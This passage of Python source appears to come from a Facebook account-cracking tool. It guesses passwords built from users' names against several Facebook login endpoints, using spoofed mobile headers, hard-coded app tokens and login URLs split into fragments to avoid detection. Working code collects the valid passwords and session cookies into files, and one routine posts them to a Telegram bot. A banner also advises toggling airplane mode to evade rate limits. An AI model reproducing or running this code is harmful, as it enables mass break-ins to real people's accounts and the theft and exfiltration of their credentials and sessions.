            data= {'m_ts': re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),'li': re.search('name="li" value="(.*?)"', str(free_fb)).group(1),'try_number': '0','unrecognized_tries': '0','email': ids,'prefill_contact_point': '','prefill_source': '','prefill_type': '','first_prefill_source': '','first_prefill_type': '','had_cp_prefilled': 'false','had_password_prefilled': 'false','is_smart_lock': 'true','bi_xrwh': '0','pass': pas,'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),'__dyn': '','__csr': '','__req': random.choice(['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '9', '0']),'__a': '','__user': '0','_fb_noscript': 'true'}
            head={
            'User-Agent': "Mozilla/5.0 (Linux; Android "+str(random.randint(4,14))+"; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/"+str(random.randint(84,106))+".0."+str(random.randint(4200,4900))+"."+str(random.randint(40,140))+"Mobile Safari/537.36",
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-User': '?1',
            'Sec-Fetch-Dest': 'document',
            'Cache-Control': 'max-age=0',
            'Referer': 'https://lm.facebook.com/',
            'DNT': '1',
            'Pragma': 'no-cache',
            'TE': 'Trailers', }
            url = 'https://p.facebook.com/method/auth.login'
            po = requests.post(url,data=data,headers=head,allow_redirects=False).text
            q = json.loads(po)
            if 'access_token' in q:
                ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);AJb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={AJb};{ckkk}"
                cid = str(q['uid'])
                ckk = f'https://graph.facebook.com/{cid}/picture?type=normal'
                res = requests.get(ckk).text
                if 'Photoshop' in res:
                        print(f'\r\r{rad}[{green}ZERO-OK{rad}]{green} {cid} {rad}▶︎ {green}{pas}')
                        print(f"\r\r{green}USR AGNT=[🤖]: {warna}{ua}\33[1;36m")
                        print(f"\r\r{green}COOKIES=[🤖]: {warna}{cookie}\33[1;36m");linex()
                        statusok = (f" {cid} | {pas} | {cookie} ")
                        requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
                        open('/sdcard/ZERO-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/ZERO-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+cookie+'\n')
                        oks.append(cid)
                        break
            elif 'www.facebook.com' in q['error']['message']:
                        print(f'\r{P} [\033[1;30mZERO-CP.txt{P}] \033[1;30m{oks.append(cid)}|{pas}')
                        open('/sdcard/ZERO-CP.txt','a').write(uid+'|'+pas+'\n')
                        cps.append(uid)
            else:
                continue
            time.sleep(0.1)
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(7)
    except Exception as e:
        pass


def __FILEX__():
    global oks,cps
    ____banner____()
    dfile = input(f'{rad}[{white}🔖{rad}] {green}EXAMPLE {rad}[{white}/sdcard/zar0.txt{rad}]\n{rad}[{white}🔖{rad}] {green}INPUT FILE PATH {white}▶︎ {yelloww}');linex()
    try:
        dx = open(dfile,'r').read().splitlines()
    except FileNotFoundError:
        print(f'{rad}[×] FILE NOT FOUND...');time.sleep(1);__FILEX__()
    dplist = []
    try:
        pass_lmit = int(input(f'{rad}[{white}🔖{rad}] {green}INPUT PASS LIMITS {white}▶︎ {yelloww}'));linex()
    except:
        pass_lmit = 3
    for i in range(pass_lmit):
        dplist.append(input(f'{rad}[{white}🔖{rad}] {green}EXAMPLE {rad}[{white}firstlast-first@12-ETC{rad}]\n{rad}[{white}🔖{rad}] {green}PASSWORD ➡ {i+1} {white}▶︎ {yelloww}'));linex()
    __METHOD__ = input(f"{rad}[{white}A{rad}]{green} METHOD M1\n{rad}[{white}B{rad}] {green}METHOD M2 \n{rad}[{white}C{rad}] {green}METHOD M3 \n{rad}[{white}D{rad}] {green}METHOD M4\n{rad}[{white}E{rad}] {green}METHOD M5 \n{rad}[{white}F{rad}] {green}METHOD M6 \n{white}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n{rad}[{white}🔖{rad}] {green}SELECTION {white}▶︎ {yelloww}");os.system('clear')
    with ThreadPool(max_workers=30) as zar0:
        ____banner____();total_ids = str(len(dx))
        print(f'{rad}[{white}🔖{rad}] {green}TOTAL IDS  {white}▶︎ \x1b[38;5;38m{total_ids}{rad} ! {green}METHOD {white}▶︎ \x1b[38;5;38m{__METHOD__}')
        print(f'{rad}[{white}🔖{green}] TURN ON/OFF AIRPLANE MODE {rong}✈{rong2}✈{rong3}✈{rong4}✈{rong5}✈{rong6}✈{rong7}✈' )
        linex()
        for user in dx:
            ids,names = user.split('|')
            passlist = dplist
            if __METHOD__ in ["A","a","1","01"]:
                zar0.submit(__MTDONEE__,ids,names,passlist,total_ids)
            elif __METHOD__ in ["B","b","2","02"]:
                zar0.submit(__MTDTWOO__,ids,names,passlist,total_ids)
            elif __METHOD__ in ["C","c","3","03"]:
                zar0.submit(__MTDTHREE__,ids,names,passlist,total_ids)
            elif __METHOD__ in ["D","d","4","04"]:
                zar0.submit(__MTDFOUR__,ids,names,passlist,total_ids)
            elif __METHOD__ in ["E","e","5","05"]:
                zar0.submit(__MTDFIVE__,ids,names,passlist,total_ids)
            elif __METHOD__ in ["F","f","6","06"]:
                zar0.submit(__MTDSIX__,ids,names,passlist,total_ids)
            else:
                zar0.submit(__MTDONEE__,ids,names,passlist,total_ids)
    print('');linex()
    print(f"{rad}[{white}🔖{rad}] {green}THE PROCESS HAS COMPLETE")
    print(f"{rad}[{white}🔖{rad}] {green}TOTAL OKS  {white}▶︎ {green}{len(oks)}")
    linex();exit()

def __MTDONEE__(ids, names, passlist, total_ids):
    global oks,cps,loop
    animasi = random.choice(["\x1b[1;91mzar0","\x1b[1;92mzar0","\x1b[1;93mzar0","\x1b[1;94mzar0","\x1b[1;95mzar0","\x1b[1;96mzar0","\x1b[1;97mzar0","\x1b[1;91mzar0","\x1b[1;92mzar0","\x1b[1;93mzar0","\x1b[1;94mzar0","\x1b[1;95mzar0","\x1b[1;96mzar0"])
    sys.stdout.write(f"\r{rad}[{animasi}-M1{rad}]{white}-{rad}[\x1b[38;5;38m{loop}{rad}]{white}-{rad}[{green}OK:{len(oks)}{rad}]{white}-{rad}[\x1b[38;5;38m{'{:.1%}'.format(loop/int(total_ids))}{rad}]"),
    sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        except:
            last = 'Khan'
        ps = first.lower()
        ps2 = last.lower()
        for fikr in passlist:
            pas = fikr.replace('First', first).replace('Last', last).replace('first', ps).replace('last', ps2)
            netheni = str(random.randint(20000, 40000))
            simheni = str(random.randint(20000, 40000))
            cban = str(random.randint(20000000, 30000000))
            user_agent = mls1()
            warna = random.choice(my_color)
            adid = str(uuid.uuid4()).upper()
            device_id = str(uuid.uuid4()).upper()
            family_device_id = str(uuid.uuid4()).upper()
            advertiser_id = str(uuid.uuid4()).upper()
            data = {
                "adid": f"{adid}",
                "device_id": f"{device_id}",
                "family_device_id": f"{family_device_id}",
                "secure_family_device_id": f"{advertiser_id}",
                "access_token": "6628568379|c1e620fa708a1d5696fb991c1bde5662",
                "sdk_version": str(random.randint(1,26)),
                "email": ids,
                "password": pas,
                "sdk": "android",
                "locale": random.choice(["en_US","en_GB","bn_IN","in_ID"]),
                "generate_session_cookies": "1",
                "sig": "c1e620fa708a1d5696fb991c1bde5662",}
            headers = [
                "Host: graph.facebook.com",
                f"x-fb-connection-bandwidth: {cban}",
                f"x-fb-sim-hni: {netheni}",
                f"x-fb-net-hni: {simheni}",
                "x-fb-connection-quality: EXCELLENT",
                "content-type: application/x-www-form-urlencoded",
                "x-fb-http-engine: Liger",
                f"User-Agent: {user_agent.encode('utf-8')}",
            ]
            url = "https://a"+"pi.face"+"book.c"+"om/a"+"uth/login"
            buffer = BytesIO()
            c = pycurl.Curl()
            c.setopt(c.URL, 'https://ap'+'i.faceb'+'ook.com/au'+'th/login')
            c.setopt(c.HTTPHEADER, headers)
            c.setopt(c.WRITEDATA, buffer)
            data_encoded = '&'.join([f"{key}={value}" for key, value in data.items()])
            c.setopt(c.POSTFIELDS, data_encoded.encode('utf-8'))
            c.perform()
            c.close()
            po = buffer.getvalue().decode('utf-8')
            q = json.loads(po)
            if 'access_token' in q:
                response_data = json.loads(po)
                cookies = response_data.get("session_cookies")
                coki = ";".join(i["name"] + "=" + i["value"] for i in cookies)
                print(f'\r\r{rad}[{green}zar0-OK{rad}]{green} {ids} {rad}: {green}{pas}')
                print(f"\r\r{rad}[{green}COOKIES=[🤖]{rad}]: {warna}{coki}")
                oks.append(ids)
                open('/sdcard/zar0-M6-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/zar0-M6-OK-COOKIE.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                break
            elif "User must verify their account" in po:
                cps.append(ids)
                #print(f'\r\r{rad}[zar0-CP]{rad} {ids} {rad}| {pas}')
                open('/sdcard/zar0-CP.txt', 'a').write(ids + '|' + pas + '\n')
                break
            else:
                continue
        loop += 1
    except pycurl.error as e:
        time.sleep(10)
    except Exception as e:
        pass


def __MTDTWOO__(ids, names, passlist, total_ids):
    global oks,cps,loop
    animasi = random.choice(["\x1b[1;91mzar0","\x1b[1;92mzar0","\x1b[1;93mzar0","\x1b[1;94mzar0","\x1b[1;95mzar0","\x1b[1;96mzar0","\x1b[1;97mzar0","\x1b[1;91mzar0","\x1b[1;92mzar0","\x1b[1;93mzar0","\x1b[1;94mzar0","\x1b[1;95mzar0","\x1b[1;96mzar0"])
    sys.stdout.write(f"\r{rad}[{animasi}-M2{rad}]{white}-{rad}[\x1b[38;5;38m{loop}{rad}]{white}-{rad}[{green}OK:{len(oks)}{rad}]{white}-{rad}[\x1b[38;5;38m{'{:.1%}'.format(loop/int(total_ids))}{rad}]"),
    sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        except:
            last = 'Khan'
        ps = first.lower()
        ps2 = last.lower()
        for fikr in passlist:
            pas = fikr.replace('First', first).replace('Last', last).replace('first', ps).replace('last', ps2)
            netheni = str(random.randint(20000, 40000))
            simheni = str(random.randint(20000, 40000))
            user_agent = mls2()
            warna = random.choice(my_color)
            adid = str(uuid.uuid4())
            device_id = str(uuid.uuid4())
            family_device_id = str(uuid.uuid4())
            advertiser_id = str(uuid.uuid4())
            data = {
                "adid": f"{adid}",
                "format": "json",
                "device_id": f"{device_id}",
                "cpl": "true",
                "family_device_id": f"{family_device_id}",
                "credentials_type": "device_based_login_password",
                "error_detail_type": "button_with_disabled",
                "source": "device_based_login",
                "email": ids,
                "password": pas,
                "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
                "generate_session_cookies": "1",
                "meta_inf_fbmeta": "",
                "advertiser_id": f"{advertiser_id}",
                "currently_logged_in_userid": "0",
                "locale": "en_US",
                "client_country_code": "US",
                "method": "auth.login",
                "fb_api_req_friendly_name": "authenticate",
                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                "api_key": "882a8490361da98702bf97a021ddc14d"}
            headers = [
                f'User-Agent: {user_agent.encode("utf-8")}',
                'Content-Type: application/x-www-form-urlencoded',
                'Host: graph.facebook.com',
                f'X-FB-Net-HNI: {netheni}',
                f'X-FB-SIM-HNI: {simheni}',
                'X-FB-Connection-Type: MOBILE.LTE',
                'X-Tigon-Is-Retry: False',
                'x-fb-session-id: nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                'x-fb-device-group: 5120',
                'X-FB-Friendly-Name: ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags: graphservice',
                'X-FB-HTTP-Engine: Liger',
                'X-FB-Client-IP: True',
                'X-FB-Server-Cluster: True',
                'x-fb-connection-token: d29d67d37eca387482a8a5b740f84f62',
            ]
            url = "https://ap"+"i.face"+"book.com/au"+"th/login"
            buffer = BytesIO()
            c = pycurl.Curl()
            c.setopt(c.URL, 'https://ap'+'i.face'+'book.com/au'+'th/login')
            c.setopt(c.HTTPHEADER, headers)
            c.setopt(c.WRITEDATA, buffer)
            data_encoded = '&'.join([f"{key}={value}" for key, value in data.items()])
            c.setopt(c.POSTFIELDS, data_encoded.encode('utf-8'))
            c.perform()
            c.close()
            po = buffer.getvalue().decode('utf-8')
            q = json.loads(po)
            if 'access_token' in q:
                response_data = json.loads(po)
                cookies = response_data.get("session_cookies")
                coki = ";".join(i["name"] + "=" + i["value"] for i in cookies)
                print(f'\r\r{rad}[{green}zar0-OK{rad}]{green} {ids} {rad}: {green}{pas}')
                print(f"\r\r{rad}[{green}COOKIES=[🤖]{rad}]: {warna}{coki}")
                oks.append(ids)
                open('/sdcard/zar0-M6-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/zar0-M6-OK-COOKIE.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                break
            elif "User must verify their account" in po:
                cps.append(ids)
                #print(f'\r\r{rad}[zar0-CP]{rad} {ids} {rad}| {pas}')
                open('/sdcard/zar0-CP.txt', 'a').write(ids + '|' + pas + '\n')
                break
            else:
                continue
        loop += 1
    except pycurl.error as e:
        time.sleep(10)
    except Exception as e:
        pass


def __MTDTHREE__(ids, names, passlist, total_ids):
    global oks,cps,loop
    animasi = random.choice(["\x1b[1;91mzar0","\x1b[1;92mzar0","\x1b[1;93mzar0","\x1b[1;94mzar0","\x1b[1;95mzar0","\x1b[1;96mzar0","\x1b[1;97mzar0","\x1b[1;91mzar0","\x1b[1;92mzar0","\x1b[1;93mzar0","\x1b[1;94mzar0","\x1b[1;95mzar0","\x1b[1;96mzar0"])
    sys.stdout.write(f"\r{rad}[{animasi}-M3{rad}]{white}-{rad}[\x1b[38;5;38m{loop}{rad}]{white}-{rad}[{green}OK:{len(oks)}{rad}]{white}-{rad}[\x1b[38;5;38m{'{:.1%}'.format(loop/int(total_ids))}{rad}]"),
    sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        except:
            last = 'Khan'
        ps = first.lower()
        ps2 = last.lower()
        for fikr in passlist:
            pas = fikr.replace('First', first).replace('Last', last).replace('first', ps).replace('last', ps2)
            netheni = str(random.randint(20000, 40000))
            simheni = str(random.randint(20000, 40000))
            user_agent = mls3()
            warna = random.choice(my_color)
            adid = str(uuid.uuid4())
            device_id = str(uuid.uuid4())
            family_device_id = str(uuid.uuid4())
            advertiser_id = str(uuid.uuid4())
            data = {
                "adid": f"{adid}",
                "format": "json",
                "device_id": f"{device_id}",
                "cpl": "true",
                "family_device_id": f"{family_device_id}",
                "credentials_type": "device_based_login_password",
                "error_detail_type": "button_with_disabled",
                "source": "device_based_login",
                "email": ids,
                "password": pas,
                "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
                "generate_session_cookies": "1",
                "meta_inf_fbmeta": "",
                "advertiser_id": f"{advertiser_id}",
                "currently_logged_in_userid": "0",
                "locale": "en_US",
                "client_country_code": "US",
                "method": "auth.login",
                "fb_api_req_friendly_name": "authenticate",
                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                "api_key": "882a8490361da98702bf97a021ddc14d"}
            headers = [
                f'User-Agent: {user_agent.encode("utf-8")}',
                'Content-Type: application/x-www-form-urlencoded',
                'Host: graph.facebook.com',
                f'X-FB-Net-HNI: {netheni}',
                f'X-FB-SIM-HNI: {simheni}',
                'X-FB-Connection-Type: MOBILE.LTE',
                'X-Tigon-Is-Retry: False',
                'x-fb-session-id: nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                'x-fb-device-group: 5120',
                'X-FB-Friendly-Name: ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags: graphservice',
                'X-FB-HTTP-Engine: Liger',
                'X-FB-Client-IP: True',
                'X-FB-Server-Cluster: True',
                'x-fb-connection-token: d29d67d37eca387482a8a5b740f84f62',
            ]
            url = "https://a"+"pi.face"+"book.com/au"+"th/login"
            buffer = BytesIO()
            c = pycurl.Curl()
            c.setopt(c.URL, 'https://a'+'pi.faceb'+'ook.com/au'+'th/login')
            c.setopt(c.HTTPHEADER, headers)
            c.setopt(c.WRITEDATA, buffer)
            data_encoded = '&'.join([f"{key}={value}" for key, value in data.items()])
            c.setopt(c.POSTFIELDS, data_encoded.encode('utf-8'))
            c.perform()
            c.close()
            po = buffer.getvalue().decode('utf-8')
            q = json.loads(po)
            if 'access_token' in q:
                response_data = json.loads(po)
                cookies = response_data.get("session_cookies")
                coki = ";".join(i["name"] + "=" + i["value"] for i in cookies)
                print(f'\r\r{rad}[{green}zar0-OK{rad}]{green} {ids} {rad}: {green}{pas}')
                print(f"\r\r{rad}[{green}COOKIES=[🤖]{rad}]: {warna}{coki}")
                oks.append(ids)
                open('/sdcard/zar0-M6-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/zar0-M6-OK-COOKIE.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                break
            elif "User must verify their account" in po:
                cps.append(ids)
                #print(f'\r\r{rad}[zar0-CP]{rad} {ids} {rad}| {pas}')
                open('/sdcard/zar0-CP.txt', 'a').write(ids + '|' + pas + '\n')
                break
            else:
                continue
        loop += 1
    except pycurl.error as e:
        time.sleep(10)
    except Exception as e:
        pass


def __MTDFOUR__(ids, names, passlist, total_ids):
    global oks,cps,loop
    animasi = random.choice(["\x1b[1;91mzar0","\x1b[1;92mzar0","\x1b[1;93mzar0","\x1b[1;94mzar0","\x1b[1;95mzar0","\x1b[1;96mzar0","\x1b[1;97mzar0","\x1b[1;91mzar0","\x1b[1;92mzar0","\x1b[1;93mzar0","\x1b[1;94mzar0","\x1b[1;95mzar0","\x1b[1;96mzar0"])
    sys.stdout.write(f"\r{rad}[{animasi}-M4{rad}]{white}-{rad}[\x1b[38;5;38m{loop}{rad}]{white}-{rad}[{green}OK:{len(oks)}{rad}]{white}-{rad}[\x1b[38;5;38m{'{:.1%}'.format(loop/int(total_ids))}{rad}]"),
    sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        except:
            last = 'Khan'
        ps = first.lower()
        ps2 = last.lower()
        for fikr in passlist:
            pas = fikr.replace('First', first).replace('Last', last).replace('first', ps).replace('last', ps2)
            netheni = str(random.randint(20000, 40000))
            simheni = str(random.randint(20000, 40000))
            user_agent = mls4()
            warna = random.choice(my_color)
            adid = str(uuid.uuid4())
            device_id = str(uuid.uuid4())
            family_device_id = str(uuid.uuid4())
            advertiser_id = str(uuid.uuid4())
            data = {
                "adid": f"{adid}",
                "format": "json",
                "device_id": f"{device_id}",
                "cpl": "true",
                "family_device_id": f"{family_device_id}",
                "credentials_type": "device_based_login_password",
                "error_detail_type": "button_with_disabled",
                "source": "device_based_login",
                "email": ids,
                "password": pas,
                "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
                "generate_session_cookies": "1",
                "meta_inf_fbmeta": "",
                "advertiser_id": f"{advertiser_id}",
                "currently_logged_in_userid": "0",
                "locale": "en_US",
                "client_country_code": "US",
                "method": "auth.login",
                "fb_api_req_friendly_name": "authenticate",
                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                "api_key": "882a8490361da98702bf97a021ddc14d"}
            headers = [
                f'User-Agent: {user_agent.encode("utf-8")}',
                'Content-Type: application/x-www-form-urlencoded',
                'Host: graph.facebook.com',
                f'X-FB-Net-HNI: {netheni}',
                f'X-FB-SIM-HNI: {simheni}',
                'X-FB-Connection-Type: MOBILE.LTE',
                'X-Tigon-Is-Retry: False',
                'x-fb-session-id: nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                'x-fb-device-group: 5120',
                'X-FB-Friendly-Name: ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags: graphservice',
                'X-FB-HTTP-Engine: Liger',
                'X-FB-Client-IP: True',
                'X-FB-Server-Cluster: True',
                'x-fb-connection-token: d29d67d37eca387482a8a5b740f84f62'
            ]
            url = 'https://gr'+'aph.face'+'book.co'+'m/au'+'th/lo'+'gin'
            buffer = BytesIO()
            c = pycurl.Curl()
            c.setopt(c.URL, 'https://gr'+'aph.face'+'book.co'+'m/au'+'th/lo'+'gin')
            c.setopt(c.HTTPHEADER, headers)
            c.setopt(c.WRITEDATA, buffer)
            data_encoded = '&'.join([f"{key}={value}" for key, value in data.items()])
            c.setopt(c.POSTFIELDS, data_encoded.encode('utf-8'))
            c.perform()
            c.close()
            po = buffer.getvalue().decode('utf-8')
            q = json.loads(po)
            if 'access_token' in q:
                response_data = json.loads(po)
                cookies = response_data.get("session_cookies")
                coki = ";".join(i["name"] + "=" + i["value"] for i in cookies)
                print(f'\r\r{rad}[{green}zar0-OK{rad}]{green} {ids} {rad}: {green}{pas}')
                print(f"\r\r{rad}[{green}COOKIES=[🤖]{rad}]: {warna}{coki}")
                oks.append(ids)
                open('/sdcard/zar0-M6-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/zar0-M6-OK-COOKIE.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                break
            elif "User must verify their account" in po:
                cps.append(ids)
                #print(f'\r\r{rad}[zar0-CP]{rad} {ids} {rad}| {pas}')
                open('/sdcard/zar0-CP.txt', 'a').write(ids + '|' + pas + '\n')
                break
            else:
                continue
        loop += 1
    except pycurl.error as e:
        time.sleep(10)
    except Exception as e:
        pass


def __MTDFIVE__(ids, names, passlist, total_ids):
    global oks,cps,loop
    animasi = random.choice(["\x1b[1;91mzar0","\x1b[1;92mzar0","\x1b[1;93mzar0","\x1b[1;94mzar0","\x1b[1;95mzar0","\x1b[1;96mzar0","\x1b[1;97mzar0","\x1b[1;91mzar0","\x1b[1;92mzar0","\x1b[1;93mzar0","\x1b[1;94mzar0","\x1b[1;95mzar0","\x1b[1;96mzar0"])
    sys.stdout.write(f"\r{rad}[{animasi}-M5{rad}]{white}-{rad}[\x1b[38;5;38m{loop}{rad}]{white}-{rad}[{green}OK:{len(oks)}{rad}]{white}-{rad}[\x1b[38;5;38m{'{:.1%}'.format(loop/int(total_ids))}{rad}]"),
    sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        except:
            last = 'Khan'
        ps = first.lower()
        ps2 = last.lower()
        for fikr in passlist:
            pas = fikr.replace('First', first).replace('Last', last).replace('first', ps).replace('last', ps2)
            netheni = str(random.randint(20000, 40000))
            simheni = str(random.randint(20000, 40000))
            user_agent = mls5()
            warna = random.choice(my_color)
            adid = str(uuid.uuid4()).upper()
            device_id = str(uuid.uuid4()).upper()
            family_device_id = str(uuid.uuid4()).upper()
            advertiser_id = str(uuid.uuid4()).upper()
            secure_family_device_id = str(uuid.uuid4()).upper()
            data = {
                "adid": f"{adid}",
                "device_id": f"{device_id}",
                "family_device_id": f"{family_device_id}",
                "secure_family_device_id": f"{secure_family_device_id}",
                "advertiser_id": f"{advertiser_id}",
                "format": "json",
                "cpl": "true",
                "credentials_type": "device_based_login_password",
                "error_detail_type": "button_with_disabled",
                "source": "register_api",
                "email": ids,
                "password": pas,
                "access_token": "275254692598279|585aec5b4c27376758abb7ffcb9db2af",
                "generate_session_cookies": "1",
                "meta_inf_fbmeta": "NO_FILE",     
                "currently_logged_in_userid": "0",
                "locale": random.choice(["ne_NP","en_US","en_GB","bn_IN","in_ID"]),
                "client_country_code": "US",
                "method": "auth.login",
                "fb_api_req_friendly_name": "authenticate",
                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                "api_key": "882a8490361da98702bf97a021ddc14d",
                "sig": "cc331688c9ec07059af4df9dbdcf7737"}
            headers = [
                "Host: graph.facebook.com",
                "Authorization: OAuth 275254692598279|585aec5b4c27376758abb7ffcb9db2af",
                f"X-FB-Net-HNI: {netheni}",
                f"X-FB-SIM-HNI: {simheni}",
                f"User-Agent: {user_agent.encode('utf-8')}",
                "X-FB-Client-IP: True",
                "X-FB-Request-Analytics-Tags: graphservice",
                "X-Tigon-Is-Retry: False",
                "X-FB-HTTP-Engine: Liger",
                "X-FB-Connection-Quality: MOBILE.LTE",
                "X-FB-Server-Cluster: True",
                "Connection: keep-alive",
                "x-fb-connection-token: d29d67d37eca387482a8a5b740f84f62",         
                "X-FB-Connection-Bandwidth: 80025933",
                "X-FB-Friendly-Name: ViewerReactionsMutation",
                "Accept-Encoding: gzip, deflate",
                "X-FB-Connection-Type: MOBILE.LTE",
                "Content-Type: application/x-www-form-urlencoded",
            ]
            url = "https://b-gr"+"aph.face"+"book.com/auth/login?incl"+"ude_head"+"ers=false&d"+"ecode_body_json=false&stre"+"amable_json_resp"+"onse=true"
            buffer = BytesIO()
            c = pycurl.Curl()
            c.setopt(c.URL, 'https://b-gr'+'aph.face'+'book.com/aut'+'h/login?include_h'+'eaders=false&de'+'code_body_json=false&str'+'eamable_json_resp'+'onse=true')
            c.setopt(c.HTTPHEADER, headers)
            c.setopt(c.WRITEDATA, buffer)
            data_encoded = '&'.join([f"{key}={value}" for key, value in data.items()])
            c.setopt(c.POSTFIELDS, data_encoded.encode('utf-8'))
            c.perform()
            c.close()
            po = buffer.getvalue().decode('utf-8')
            q = json.loads(po)
            if 'access_token' in q:
                response_data = json.loads(po)
                cookies = response_data.get("session_cookies")
                coki = ";".join(i["name"] + "=" + i["value"] for i in cookies)
                print(f'\r\r{rad}[{green}zar0-OK{rad}]{green} {ids} {rad}: {green}{pas}')
                print(f"\r\r{rad}[{green}COOKIES=[🤖]{rad}]: {warna}{coki}")
                oks.append(ids)
                open('/sdcard/zar0-M6-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/zar0-M6-OK-COOKIE.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                break
            elif "User must verify their account" in po:
                cps.append(ids)
                #print(f'\r\r{rad}[zar0-CP]{rad} {ids} {rad}| {pas}')
                open('/sdcard/zar0-CP.txt', 'a').write(ids + '|' + pas + '\n')
                break
            else:
                continue
        loop += 1
    except pycurl.error as e:
        time.sleep(10)
    except Exception as e:
        pass



def __MTDSIX__(ids, names, passlist, total_ids):
    global oks,cps,loop
    animasi = random.choice(["\x1b[1;91mzar0","\x1b[1;92mzar0","\x1b[1;93mzar0","\x1b[1;94mzar0","\x1b[1;95mzar0","\x1b[1;96mzar0","\x1b[1;97mzar0","\x1b[1;91mzar0","\x1b[1;92mzar0","\x1b[1;93mzar0","\x1b[1;94mzar0","\x1b[1;95mzar0","\x1b[1;96mzar0"])
    sys.stdout.write(f"\r{rad}[{animasi}-M6{rad}]{white}-{rad}[\x1b[38;5;38m{loop}{rad}]{white}-{rad}[{green}OK:{len(oks)}{rad}]{white}-{rad}[\x1b[38;5;38m{'{:.1%}'.format(loop/int(total_ids))}{rad}]"),
    sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        except:
            last = 'Khan'
        ps = first.lower()
        ps2 = last.lower()
        for fikr in passlist:
            pas = fikr.replace('First', first).replace('Last', last).replace('first', ps).replace('last', ps2)
            metheni = str(random.randint(20000000, 40000000)),
            netheni = str(random.randint(20000, 40000))
            simheni = str(random.randint(20000, 40000))
            user_agent = mls6()
            warna = random.choice(my_color)
            adid = str(uuid.uuid4()).upper()
            device_id = str(uuid.uuid4()).upper()
            family_device_id = str(uuid.uuid4()).upper()
            advertiser_id = str(uuid.uuid4()).upper()
            secure_family_device_id = str(uuid.uuid4()).upper()
            data = {
            "adid": f"{adid}",
            "device_id": f"{device_id}",
            "family_device_id": f"{family_device_id}",
            "secure_family_device_id": f"{secure_family_device_id}",
            "advertiser_id": f"{advertiser_id}",
            "method": "POST",
            "format": "json",
            "email": ids,
            "password": pas,
            "cpl": "true",
            "credentials_type": "password",
            "generate_session_cookies": "1",
            "error_detail_type": "button_with_disabled",
            "generate_machine_id": "1",
            "locale": "en_US",
            "client_country_code": "US",
            "omit_response_on_success": "false",
            "fb_api_req_friendly_name": "authenticate"}
            headers = [
            "Host: b-graph.facebook.com",
            "Authorization: OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895",
            f"x-fb-connection-bandwidth: {metheni}",
            f"X-FB-Net-HNI: {netheni}",
            f"X-FB-SIM-HNI: {simheni}",
            f"User-Agent: {user_agent.encode('utf-8')}",
            "x-fb-connection-quality: GOOD",
            "x-fb-connection-type: MOBILE.LTE",
            "content-type: app_authlication/x-www-form-urlencoded",
            "x-fb-http-engine: Liger",
            "x-fb-client-IP: True",
            "x-fb-server-cluster: Keep-Alive",
            "Content-Type: application/json",
            ]
            url = 'https://gr'+'aph.face'+'book.co'+'m/au'+'th/lo'+'gin'
            buffer = BytesIO()
            c = pycurl.Curl()
            c.setopt(c.URL, 'https://gr'+'aph.face'+'book.co'+'m/au'+'th/lo'+'gin')
            c.setopt(c.HTTPHEADER, headers)
            c.setopt(c.WRITEDATA, buffer)
            data_encoded = '&'.join([f"{key}={value}" for key, value in data.items()])
